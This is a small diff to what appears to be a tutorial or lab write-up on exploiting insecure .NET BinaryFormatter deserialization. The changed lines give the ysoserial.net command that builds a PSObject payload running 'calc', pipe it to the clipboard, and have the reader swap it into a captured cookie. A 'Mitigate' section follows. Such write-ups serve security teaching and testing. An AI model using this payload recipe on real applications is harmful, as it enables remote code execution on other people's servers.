@@ -28,7 +28,8 @@ We can exploit this like so:
 Generate the payload
 --------------------
 1. Download [pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net).
-2. Run: ```ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t [Captured UserDetails Cookie Value]```
+2. Run: ```ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" | clip```
+3. Overwrite the cookie value with the payload that's now stored in the clipboard'
 
 Mitigate
 --------
